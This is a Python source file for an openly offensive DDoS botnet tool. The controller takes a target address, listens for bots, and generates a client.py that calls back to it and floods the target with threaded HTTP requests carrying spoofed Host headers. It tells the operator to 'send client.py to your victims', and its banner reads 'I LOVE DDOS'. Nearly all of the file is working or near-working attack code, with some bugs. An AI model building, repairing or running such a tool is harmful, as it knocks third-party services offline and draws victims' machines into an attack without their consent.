from rich.console import Console

import os
import socket
import sys
import threading

def accept_bot():
    while True:
        s.listen()
        client, addr = s.accept()
        clients.append(client)

def create_file(ip, host_port, target, target_port):
    os.system("touch client.py")

    with open("client.py", "w") as f:
        f.write(f"""import os
import random
import socket
import threading

def add_useragent():
    return ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            "(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
            "Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
            "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)"]

def attack(target, fake_ip, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.settimeout(5.0)
        
        text = random.choice(["GET", "POST"]) + " /" + target + " HTTP/1.1\r\n"+\
		      "Host:" + fake_ip + "\r\n" +\
		      "User-Agent:" + random.choice(add_useragent()) + "\r\n" +\
		      "Content-Length: 42\r\n"

        s.sendto(text.encode(), (target, port))
        if s:
        	s.sendall("X-a: b\r\n")

def fake_ip_generator():
	rand = []
	for x in range(4):
		rand.append(random.randrange(0,256))

	if str(rand[0]) == "127":
		fake_ip_generator()

	return "%d.%d.%d.%d" % (rand[0],rand[1],rand[2],rand[3])

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(({ip}, {host_port}))

    s.recv()

    fake_ip = fake_ip_generator()

    for _ in range(500):
        thread = threading.Thread(target=attack, args=({target}, fake_ip, {target_port}))
        thread.start()
        
""")
    
    console.print("Done, send client.py to your victims", style="bold blue")

def exiting():
    console.print("\nExiting ...", style="bold red")
    if s != None:
        s.close()
    sys.exit()

def initialize():
    try:
        global clients, console, packets, s
        clients = []
        console = Console()
        packets = 0
        s = None

        show_banner()
        console.print("\n   An anonymized DDos tool", style="bold red")
        target = console.input("\n[bold blue][+][/bold blue] Enter IP address of Target: ")
        port = console.input("[bold blue][+][/bold blue] Enter the target's port: ")

        ip = console.input("\n[bold blue][+][/bold blue] Enter your IP: ")
        host_port = int(console.input("[bold blue][+][/bold blue] Enter the port you want to use: "))

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, host_port))

        create_file(ip, host_port, target, port)

        threading.Thread(target=accept_bot).start()
        threading.Thread(target=start).start()

        while True:
            pass

    except KeyboardInterrupt:
        exiting()
    
    except Exception as e:
        console.print(f"Error: {e}", style="bold red")

def show_banner():
    banner = """
                                         )
                            )      ((     (
                           (        ))     )
                    )       )      //     (
               _   (        __    (     ~->>
        ,-----' |__,_~~___<'__`)-~__--__-~->> <
        | //  : | -__   ~__ o)____)),__ - '> >-  >
        | //  : |- \_ \ -\_\ -\ \ \ ~\_  \ ->> - ,  >>
        | //  : |_~_\ -\__\ \~'\ \ \, \__ . -<-  >>
        `-----._| `  -__`-- - ~~ -- ` --~> >
         _/___\_    //)_`//  | ||]
   _____[_______]_[~~-_ (.L_/  ||
  [____________________]' `\_,/'/       
    ||| /          |||  ,___,'./
    ||| \          |||,'______|
    ||| /          /|| I==||                I LOVE
    ||| \       __/_||  __||__            DDOS !!! <3
-----||-/------`-._/||-o--o---o---
  ~~~~~'

    """
    console.print(banner, style="bold")

def start():
    console.input("[red]\nPress [bold]ENTER[/bold] to start...[/red]") 
    for client in clients:
        client.send("a".encode("ascii"))

    console.print("Starting the attack ︻┻┳══━一 \n", style="bold red")
